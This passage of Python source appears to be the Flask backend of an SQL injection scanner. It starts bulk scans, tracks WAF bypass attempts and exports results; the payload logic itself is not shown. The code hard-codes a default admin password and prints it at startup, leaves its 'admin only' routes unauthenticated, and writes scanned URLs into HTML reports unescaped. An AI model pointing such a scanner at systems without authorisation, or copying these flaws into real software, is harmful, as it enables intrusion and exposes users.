        'timestamp': datetime.utcnow().isoformat(),
        'database': 'connected',
        'features': {
            'ml_scoring': app.config['ENABLE_ML_SCORING'],
            'waf_detection': app.config['ENABLE_WAF_DETECTION'],
            'webhooks': app.config['ENABLE_WEBHOOKS'],
            'distributed': app.config['ENABLE_DISTRIBUTED']
        }
    })

@app.route('/api/status', methods=['GET'])
@limiter.limit("60 per minute")
def get_status():
    """Get current scan status"""
    return jsonify(scan_state.to_dict())

@app.route('/api/scan/start', methods=['POST'])
@limiter.limit("10 per minute")
def start_scan():
    """Start a new scan"""
    try:
        data = request.get_json()
        
        # Validate input
        urls = data.get('urls', [])
        if isinstance(urls, str):
            urls = [u.strip() for u in urls.split('\n') if u.strip()]
        
        if not urls:
            return jsonify({'error': 'No URLs provided'}), 400
        
        # Check if scan is already running
        if scan_state.status == ScanStatus.RUNNING.value:
            return jsonify({'error': 'A scan is already running'}), 409
        
        # Create scan record
        scan_id = str(uuid.uuid4())
        scan_record = Scan(
            scan_id=scan_id,
            name=data.get('name', f'Scan {datetime.now().strftime("%Y-%m-%d %H:%M")}'),
            description=data.get('description', ''),
            tags=data.get('tags', []),
            priority=data.get('priority', 5),
            total_urls=len(urls),
            status=ScanStatus.QUEUED.value,
            config=data.get('config', {})
        )
        
        db.session.add(scan_record)
        db.session.commit()
        
        # Log audit
        log_audit('scan_started', 'scan', scan_id, {
            'url_count': len(urls),
            'name': scan_record.name
        })
        
        # Start scan in background
        scan_thread = threading.Thread(
            target=run_scan_worker,
            args=(scan_record.id, urls, data.get('config', {}))
        )
        scan_thread.daemon = True
        scan_thread.start()
        
        return jsonify({
            'success': True,
            'scan_id': scan_id,
            'message': f'Scan started with {len(urls)} URLs'
        })
        
    except Exception as e:
        logger.error(f"Error starting scan: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/stop', methods=['POST'])
@limiter.limit("20 per minute")
def stop_scan():
    """Stop current scan"""
    try:
        global stop_scan_flag
        stop_scan_flag.set()
        
        log_audit('scan_stopped', 'scan', scan_state.scan_id)
        
        return jsonify({
            'success': True,
            'message': 'Scan stop requested'
        })
    except Exception as e:
        logger.error(f"Error stopping scan: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/pause', methods=['POST'])
@limiter.limit("20 per minute")
def pause_scan():
    """Pause current scan"""
    try:
        scan_state.update(status=ScanStatus.PAUSED.value)
        
        log_audit('scan_paused', 'scan', scan_state.scan_id)
        
        return jsonify({
            'success': True,
            'message': 'Scan paused'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/resume', methods=['POST'])
@limiter.limit("20 per minute")
def resume_scan():
    """Resume paused scan"""
    try:
        scan_state.update(status=ScanStatus.RUNNING.value)
        
        log_audit('scan_resumed', 'scan', scan_state.scan_id)
        
        return jsonify({
            'success': True,
            'message': 'Scan resumed'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/results', methods=['GET'])
@limiter.limit("100 per minute")
@cache.cached(timeout=60, query_string=True)
def get_results():
    """Get scan results with filtering"""
    try:
        scan_id = request.args.get('scan_id')
        verdict = request.args.get('verdict')
        risk_level = request.args.get('risk_level')
        page = int(request.args.get('page', 1))
        per_page = int(request.args.get('per_page', 100))
        
        query = ScanResult.query
        
        if scan_id:
            scan = Scan.query.filter_by(scan_id=scan_id).first()
            if scan:
                query = query.filter_by(scan_id=scan.id)
        
        if verdict:
            query = query.filter_by(verdict=verdict)
        
        if risk_level:
            query = query.filter_by(risk_level=risk_level)
        
        # Pagination
        results = query.order_by(ScanResult.timestamp.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        return jsonify({
            'results': [r.to_dict() for r in results.items],
            'total': results.total,
            'pages': results.pages,
            'current_page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting results: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/export', methods=['POST'])
@limiter.limit("10 per hour")
def export_results():
    """Export scan results in various formats"""
    try:
        data = request.get_json()
        export_format = data.get('format', 'json')
        results_data = data.get('results', [])
        options = data.get('options', {})
        
        if not results_data:
            return jsonify({'error': 'No results to export'}), 400
        
        # Create exports directory
        os.makedirs(app.config['EXPORT_FOLDER'], exist_ok=True)
        
        filename = f"scan_results_{int(time.time())}"
        
        if export_format == 'json':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.json")
            with open(filepath, 'w') as f:
                json.dump(results_data, f, indent=2)
        
        elif export_format == 'csv':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.csv")
            with open(filepath, 'w', newline='') as f:
                if results_data:
                    writer = csv.DictWriter(f, fieldnames=results_data[0].keys())
                    writer.writeheader()
                    writer.writerows(results_data)
        
        elif export_format == 'html':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.html")
            html_content = generate_html_report(results_data, options)
            with open(filepath, 'w') as f:
                f.write(html_content)
        
        elif export_format == 'pdf':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.pdf")
            generate_pdf_report(results_data, filepath, options)
        
        elif export_format == 'markdown':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.md")
            md_content = generate_markdown_report(results_data, options)
            with open(filepath, 'w') as f:
                f.write(md_content)
        
        elif export_format == 'sarif':
            filepath = os.path.join(app.config['EXPORT_FOLDER'], f"{filename}.sarif")
            sarif_content = generate_sarif_report(results_data)
            with open(filepath, 'w') as f:
                json.dump(sarif_content, f, indent=2)
        
        else:
            return jsonify({'error': f'Unsupported format: {export_format}'}), 400
        
        log_audit('results_exported', 'export', filename, {
            'format': export_format,
            'result_count': len(results_data)
        })
        
        return send_file(filepath, as_attachment=True)
        
    except Exception as e:
        logger.error(f"Error exporting results: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/history', methods=['GET'])
@limiter.limit("60 per minute")
@cache.cached(timeout=120)
def get_scan_history():
    """Get scan history"""
    try:
        limit = int(request.args.get('limit', 50))
        offset = int(request.args.get('offset', 0))
        
        scans = Scan.query.order_by(Scan.created_at.desc()).limit(limit).offset(offset).all()
        
        return jsonify({
            'scans': [scan.to_dict() for scan in scans],
            'total': Scan.query.count()
        })
        
    except Exception as e:
        logger.error(f"Error getting history: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/history/<scan_id>', methods=['GET'])
@limiter.limit("60 per minute")
@cache.cached(timeout=300)
def get_scan_details(scan_id):
    """Get details of a specific scan"""
    try:
        scan = Scan.query.filter_by(scan_id=scan_id).first()
        
        if not scan:
            return jsonify({'error': 'Scan not found'}), 404
        
        results = ScanResult.query.filter_by(scan_id=scan.id).all()
        
        return jsonify({
            'scan': scan.to_dict(),
            'results': [r.to_dict() for r in results]
        })
        
    except Exception as e:
        logger.error(f"Error getting scan details: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings', methods=['GET', 'POST'])
@limiter.limit("30 per minute")
def manage_settings():
    """Get or update settings"""
    try:
        if request.method == 'GET':
            settings = Setting.query.all()
            return jsonify({
                'settings': {s.key: s.value for s in settings}
            })
        
        else:  # POST
            data = request.get_json()
            
            for key, value in data.items():
                setting = Setting.query.filter_by(key=key).first()
                if setting:
                    setting.value = value
                    setting.updated_at = datetime.utcnow()
                else:
                    setting = Setting(key=key, value=value)
                    db.session.add(setting)
            
            db.session.commit()
            
            log_audit('settings_updated', 'settings', None, data)
            
            return jsonify({
                'success': True,
                'message': 'Settings updated'
            })
            
    except Exception as e:
        logger.error(f"Error managing settings: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/statistics', methods=['GET'])
@limiter.limit("60 per minute")
@cache.cached(timeout=60)
def get_statistics():
    """Get global statistics"""
    try:
        total_scans = Scan.query.count()
        completed_scans = Scan.query.filter_by(status=ScanStatus.COMPLETED.value).count()
        
        total_urls = db.session.query(db.func.sum(Scan.total_urls)).scalar() or 0
        total_vulnerable = db.session.query(db.func.sum(Scan.vulnerable_count)).scalar() or 0
        
        # Recent scans (last 24 hours)
        recent_scans = Scan.query.filter(
            Scan.created_at >= datetime.utcnow() - timedelta(hours=24)
        ).count()
        
        # Risk distribution
        risk_distribution = db.session.query(
            ScanResult.risk_level,
            db.func.count(ScanResult.id)
        ).group_by(ScanResult.risk_level).all()
        
        return jsonify({
            'total_scans': total_scans,
            'completed_scans': completed_scans,
            'total_urls_scanned': total_urls,
            'total_vulnerabilities': total_vulnerable,
            'recent_scans_24h': recent_scans,
            'risk_distribution': {level: count for level, count in risk_distribution},
            'vulnerability_rate': round((total_vulnerable / total_urls * 100), 2) if total_urls > 0 else 0
        })
        
    except Exception as e:
        logger.error(f"Error getting statistics: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/audit', methods=['GET'])
@limiter.limit("30 per minute")
def get_audit_logs():
    """Get audit logs (admin only)"""
    try:
        limit = int(request.args.get('limit', 100))
        offset = int(request.args.get('offset', 0))
        action = request.args.get('action')
        
        query = AuditLog.query
        
        if action:
            query = query.filter_by(action=action)
        
        logs = query.order_by(AuditLog.timestamp.desc()).limit(limit).offset(offset).all()
        
        return jsonify({
            'logs': [log.to_dict() for log in logs],
            'total': query.count()
        })
        
    except Exception as e:
        logger.error(f"Error getting audit logs: {str(e)}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# REPORT GENERATORS
# ============================================================================

def generate_html_report(results: List[dict], options: dict) -> str:
    """Generate HTML report"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>SQL Injection Scan Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background: #667eea; color: white; padding: 20px; }
            .summary { background: #f3f4f6; padding: 15px; margin: 20px 0; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { background: #374151; color: white; padding: 10px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #e5e7eb; }
            .critical { background: #fef2f2; }
            .high { background: #fff7ed; }
            .medium { background: #fffbeb; }
            .low { background: #f0fdf4; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>SQL Injection Vulnerability Report</h1>
            <p>Generated: {}</p>
        </div>
        <div class="summary">
            <h2>Summary</h2>
            <p><strong>Total URLs Tested:</strong> {}</p>
            <p><strong>Vulnerabilities Found:</strong> {}</p>
        </div>
        <table>
            <thead>
                <tr>
                    <th>URL</th>
                    <th>Verdict</th>
                    <th>Risk Level</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
    """.format(
        datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        len(results),
        len([r for r in results if r.get('verdict') == 'VULNERABLE'])
    )
    
    for result in results:
        risk_class = result.get('risk_level', 'info').lower()
        html += f"""
            <tr class="{risk_class}">
                <td>{result.get('url', '')}</td>
                <td>{result.get('verdict', '')}</td>
                <td>{result.get('risk_level', '')}</td>
                <td>{result.get('details', '')}</td>
            </tr>
        """
    
    html += """
            </tbody>
        </table>
    </body>
    </html>
    """
    
    return html

def generate_pdf_report(results: List[dict], filepath: str, options: dict):
    """Generate PDF report"""
    doc = SimpleDocTemplate(filepath, pagesize=letter)
    elements = []
    styles = getSampleStyleSheet()
    
    # Title
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        textColor=colors.HexColor('#667eea'),
        spaceAfter=30,
        alignment=TA_CENTER
    )
    elements.append(Paragraph("SQL Injection Scan Report", title_style))
    elements.append(Spacer(1, 0.2*inch))
    
    # Summary
    summary_data = [
        ['Total URLs', str(len(results))],
        ['Vulnerabilities', str(len([r for r in results if r.get('verdict') == 'VULNERABLE']))],
        ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')]
    ]
    summary_table = Table(summary_data, colWidths=[2*inch, 3*inch])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, -1), colors.lightgrey),
        ('TEXTCOLOR', (0, 0), (-1, -1), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, -1), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 12),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    elements.append(summary_table)
    elements.append(Spacer(1, 0.3*inch))
    
    # Results table
    if results:
        data = [['URL', 'Verdict', 'Risk', 'Details']]
        for result in results[:50]:  # Limit to 50 results
            data.append([
                result.get('url', '')[:40] + '...' if len(result.get('url', '')) > 40 else result.get('url', ''),
                result.get('verdict', ''),
                result.get('risk_level', ''),
                result.get('details', '')[:50] + '...' if len(result.get('details', '')) > 50 else result.get('details', '')
            ])
        
        results_table = Table(data)
        results_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 10),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        elements.append(results_table)
    
    doc.build(elements)

def generate_markdown_report(results: List[dict], options: dict) -> str:
    """Generate Markdown report"""
    md = f"""# SQL Injection Scan Report

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Summary

- **Total URLs Tested:** {len(results)}
- **Vulnerabilities Found:** {len([r for r in results if r.get('verdict') == 'VULNERABLE'])}
- **Safe URLs:** {len([r for r in results if r.get('verdict') == 'SAFE'])}

## Detailed Results

| URL | Verdict | Risk Level | Details |
|-----|---------|-----------|---------|
"""
    
    for result in results:
        md += f"| {result.get('url', '')} | {result.get('verdict', '')} | {result.get('risk_level', '')} | {result.get('details', '')} |\n"
    
    return md

def generate_sarif_report(results: List[dict]) -> dict:
    """Generate SARIF (Static Analysis Results Interchange Format) report"""
    sarif = {
        "version": "2.1.0",
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "VIP SQLi Scanner",
                    "version": "4.0",
                    "informationUri": "https://github.com/vipsqli/scanner",
                    "rules": [{
                        "id": "CWE-89",
                        "name": "SQLInjection",
                        "shortDescription": {
                            "text": "SQL Injection"
                        },
                        "fullDescription": {
                            "text": "The software constructs SQL queries using user input without proper sanitization."
                        },
                        "helpUri": "https://cwe.mitre.org/data/definitions/89.html"
                    }]
                }
            },
            "results": []
        }]
    }
    
    for result in results:
        if result.get('verdict') == 'VULNERABLE':
            sarif_result = {
                "ruleId": "CWE-89",
                "level": "error",
                "message": {
                    "text": result.get('details', 'SQL Injection vulnerability detected')
                },
                "locations": [{
                    "physicalLocation": {
                        "artifactLocation": {
                            "uri": result.get('url', '')
                        },
                        "region": {
                            "snippet": {
                                "text": result.get('payload', '')
                            }
                        }
                    }
                }]
            }
            sarif["runs"][0]["results"].append(sarif_result)
    
    return sarif

# ============================================================================
# SCAN WORKER
# ============================================================================

def run_scan_worker(scan_id: int, urls: List[str], config: dict):
    """
    Background worker for running scans
    Improved with work queue and better error handling
    """
    global stop_scan_flag
    stop_scan_flag.clear()
    
    # Create thread-local session
    session = create_session()
    
    try:
        # Get scan from database
        scan = session.query(Scan).get(scan_id)
        if not scan:
            logger.error(f"Scan {scan_id} not found")
            return
        
        # Update scan status
        scan.status = ScanStatus.RUNNING.value
        scan.started_at = datetime.utcnow()
        session.commit()
        
        # Initialize scan state
        scan_state.update(
            scan_id=scan.scan_id,
            status=ScanStatus.RUNNING.value,
            total=len(urls),
            scanned=0,
            vulnerable=0,
            safe=0,
            errors=0,
            suspicious=0,
            timeout=0,
            waf_blocked=0,
            start_time=time.time()
        )
        
        # Emit start event
        socketio.emit('scan_started', {
            'scan_id': scan.scan_id,
            'total_urls': len(urls)
        })
        
        # Process URLs with thread pool
        response_times = []
        
        with ThreadPoolExecutor(max_workers=config.get('max_concurrent', 10)) as executor:
            future_to_url = {
                executor.submit(
                    VulnerabilityScanner.test_url, 
                    url, 
                    config
                ): url for url in urls
            }
            
            for future in as_completed(future_to_url):
                if stop_scan_flag.is_set():
                    logger.info("Scan stopped by user")
                    break
                
                url = future_to_url[future]
                
                try:
                    result = future.result()
                    
                    # Create scan result record
                    scan_result = ScanResult(
                        scan_id=scan.id,
                        url=result['url'],
                        method=result['method'],
                        verdict=result['verdict'],
                        risk_level=result['risk_level'],
                        confidence=result['confidence'],
                        attack_type=result.get('attack_type'),
                        payload=result.get('payload'),
                        injection_point=result.get('injection_point'),
                        details=result['details'],
                        errors=result.get('errors', []),
                        evidence=result.get('evidence', {}),
                        response_time=result.get('response_time'),
                        response_code=result.get('response_code'),
                        waf_detected=result.get('waf_detected', False),
                        waf_type=result.get('waf_type'),
                        bypass_attempted=result.get('bypass_attempted', False),
                        bypass_successful=result.get('bypass_successful', False),
                        remediation=result.get('remediation'),
                        cvss_score=result.get('cvss_score'),
                        cwe_id=result.get('cwe_id', 'CWE-89')
                    )
                    
                    session.add(scan_result)
                    
                    # Update scan statistics
                    scan.scanned_urls += 1
                    
                    if result['verdict'] == VerdictType.VULNERABLE.value:
                        scan.vulnerable_count += 1
                        scan_state.update(vulnerable=scan_state.vulnerable + 1)
                    elif result['verdict'] == VerdictType.SAFE.value:
                        scan.safe_count += 1
                        scan_state.update(safe=scan_state.safe + 1)
                    elif result['verdict'] == VerdictType.SUSPICIOUS.value:
                        scan.suspicious_count += 1
                        scan_state.update(suspicious=scan_state.suspicious + 1)
                    elif result['verdict'] == VerdictType.TIMEOUT.value:
                        scan.timeout_count += 1
                        scan_state.update(timeout=scan_state.timeout + 1)
                    elif result['verdict'] == VerdictType.ERROR.value:
                        scan.error_count += 1
                        scan_state.update(errors=scan_state.errors + 1)
                    
                    if result.get('waf_detected'):
                        scan.waf_blocked_count += 1
                        scan_state.update(waf_blocked=scan_state.waf_blocked + 1)
                    
                    # Track response time
                    if result.get('response_time'):
                        response_times.append(result['response_time'])
                    
                    # Update scan state
                    scan_state.update(
                        scanned=scan.scanned_urls,
                        current_url=url
                    )
                    
                    # Commit periodically
                    if scan.scanned_urls % 10 == 0:
                        session.commit()
                    
                    # Emit progress update
                    socketio.emit('scan_progress', {
                        'scan_id': scan.scan_id,
                        'progress': scan_state.to_dict()
                    })
                    
                    # Emit new result
                    socketio.emit('new_result', result)
                    
                except Exception as e:
                    logger.error(f"Error processing {url}: {str(e)}")
                    scan.error_count += 1
                    scan.scanned_urls += 1
                    scan_state.update(
                        errors=scan_state.errors + 1,
                        scanned=scan.scanned_urls
                    )
        
        # Calculate final statistics
        if response_times:
            scan.avg_response_time = statistics.mean(response_times)
            scan.max_response_time = max(response_times)
            scan.min_response_time = min(response_times)
        
        # Calculate risk score (simple algorithm, can be enhanced with ML)
        if scan.total_urls > 0:
            vuln_rate = scan.vulnerable_count / scan.total_urls
            scan.risk_score = min(vuln_rate * 100, 100)
            scan.confidence_score = (scan.scanned_urls / scan.total_urls) * 100
        
        # Final commit
        scan.status = ScanStatus.COMPLETED.value if not stop_scan_flag.is_set() else ScanStatus.STOPPED.value
        scan.completed_at = datetime.utcnow()
        session.commit()
        
        # Send completion notification
        send_notification(scan.id, 'completed', scan.to_dict())
        
        # Emit completion
        socketio.emit('scan_complete', {
            'scan_id': scan.scan_id,
            'statistics': scan.to_dict()
        })
        
        logger.info(f"Scan {scan.scan_id} completed successfully")
        
    except Exception as e:
        logger.error(f"Scan worker error: {str(e)}", exc_info=True)
        
        try:
            scan = session.query(Scan).get(scan_id)
            if scan:
                scan.status = ScanStatus.ERROR.value
                scan.completed_at = datetime.utcnow()
                session.commit()
        except:
            pass
        
        socketio.emit('scan_error', {
            'scan_id': getattr(scan, 'scan_id', None),
            'error': str(e)
        })
    
    finally:
        scan_state.reset()
        session.close()

# ============================================================================
# WEBSOCKET EVENTS
# ============================================================================

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    logger.info(f"Client connected: {request.sid}")
    emit('connected', {
        'message': 'Connected to VIP SQLi Scanner v4.0',
        'version': '4.0',
        'timestamp': datetime.utcnow().isoformat(),
        'features': {
            'ml_scoring': app.config['ENABLE_ML_SCORING'],
            'waf_detection': app.config['ENABLE_WAF_DETECTION'],
            'webhooks': app.config['ENABLE_WEBHOOKS']
        }
    })

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('join_scan')
def handle_join_scan(data):
    """Join a scan room for real-time updates"""
    scan_id = data.get('scan_id')
    if scan_id:
        join_room(scan_id)
        logger.info(f"Client {request.sid} joined scan room: {scan_id}")
        emit('joined_scan', {'scan_id': scan_id})

@socketio.on('leave_scan')
def handle_leave_scan(data):
    """Leave a scan room"""
    scan_id = data.get('scan_id')
    if scan_id:
        leave_room(scan_id)
        logger.info(f"Client {request.sid} left scan room: {scan_id}")
        emit('left_scan', {'scan_id': scan_id})

@socketio.on('request_status')
def handle_status_request():
    """Handle status request"""
    emit('status_update', scan_state.to_dict())

# ============================================================================
# ERROR HANDLERS
# ============================================================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'error': 'Not found',
        'message': 'The requested resource was not found',
        'code': 404
    }), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {str(error)}", exc_info=True)
    return jsonify({
        'error': 'Internal server error',
        'message': 'An unexpected error occurred',
        'code': 500
    }), 500

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': 'Rate limit exceeded',
        'message': str(e.description),
        'code': 429
    }), 429

@app.errorhandler(400)
def bad_request(error):
    return jsonify({
        'error': 'Bad request',
        'message': 'The request could not be understood',
        'code': 400
    }), 400

# ============================================================================
# DATABASE INITIALIZATION
# ============================================================================

def init_database():
    """Initialize database with default data"""
    with app.app_context():
        db.create_all()
        
        # Create default admin user
        if not User.query.filter_by(username='admin').first():
            admin = User(
                username='admin',
                email='admin@vipsqli.local',
                role='admin'
            )
            admin.set_password('Admin@123!')  # Strong default password
            admin.generate_api_key()
            
            db.session.add(admin)
            logger.info("Default admin user created")
        
        # Create default settings
        default_settings = {
            'max_concurrent': {'value': 100, 'category': 'performance'},
            'timeout': {'value': 30, 'category': 'performance'},
            'max_retries': {'value': 3, 'category': 'performance'},
            'waf_detection': {'value': True, 'category': 'scanning'},
            'error_based': {'value': True, 'category': 'scanning'},
            'boolean_based': {'value': True, 'category': 'scanning'},
            'time_based': {'value': False, 'category': 'scanning'},
            'notifications_enabled': {'value': True, 'category': 'notifications'},
            'email_notifications': {'value': False, 'category': 'notifications'},
            'webhook_url': {'value': '', 'category': 'notifications'},
        }
        
        for key, data in default_settings.items():
            if not Setting.query.filter_by(key=key).first():
                setting = Setting(
                    key=key,
                    value=data['value'],
                    category=data['category']
                )
                db.session.add(setting)
        
        db.session.commit()
        logger.info("Database initialized successfully")

# ============================================================================
# COMPATIBILITY FUNCTIONS
# ============================================================================

def start_dashboard():
    """Start the dashboard server"""
    banner = """
╔═══════════════════════════════════════════════════════════════════════╗
║                 VIP SQLi Scanner v4.0                                 ║
║              Enhanced Security Scanner Dashboard                       ║
╚═══════════════════════════════════════════════════════════════════════╝

🚀 Starting server on http://localhost:5000
📊 Dashboard: http://localhost:5000
🔍 API Health: http://localhost:5000/api/health
📚 Statistics: http://localhost:5000/api/statistics

⚙️  Features Enabled:
   ✓ Multi-threaded scanning
   ✓ WAF detection
   ✓ Advanced payloads
   ✓ ML-based scoring: {}
   ✓ Export formats: JSON, CSV, HTML, PDF, MD, SARIF
   ✓ Real-time WebSocket updates
   ✓ Rate limiting
   ✓ Audit logging

⚠️  Default Admin Credentials:
   Username: admin
   Password: Admin@123!
   ⚡ CHANGE IMMEDIATELY FOR PRODUCTION!

📝 Press Ctrl+C to stop
    """.format('Yes' if app.config['ENABLE_ML_SCORING'] else 'No')
    
    print(banner)
    
    # Initialize database
    init_database()
    
    # Create required directories
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('exports', exist_ok=True)
    os.makedirs('logs', exist_ok=True)
    
    # Run server
    socketio.run(
        app,
        host='0.0.0.0',
        port=5000,
        debug=False,
        allow_unsafe_werkzeug=True
    )

def broadcast_update(data):
    """Broadcast update to all connected clients"""
    socketio.emit('scan_update', data)

# ============================================================================
# CLI COMMANDS
# ============================================================================

@app.cli.command()
def create_admin():
    """Create admin user via CLI"""
    username = input("Enter admin username: ")
    email = input("Enter admin email: ")
    password = input("Enter admin password: ")
    
    user = User(username=username, email=email, role='admin')
    user.set_password(password)
    user.generate_api_key()
    
    db.session.add(user)
    db.session.commit()
    
    print(f"✅ Admin user created: {username}")
    print(f"🔑 API Key: {user.api_key}")

@app.cli.command()
def init_db():
    """Initialize database"""
    init_database()
    print("✅ Database initialized!")

@app.cli.command()
def export_db():
    """Export database to JSON"""
    scans = Scan.query.all()
    data = {
        'scans': [scan.to_dict() for scan in scans],
        'export_date': datetime.utcnow().isoformat()
    }
    
    filename = f"export_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"✅ Database exported to {filename}")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    start_dashboard()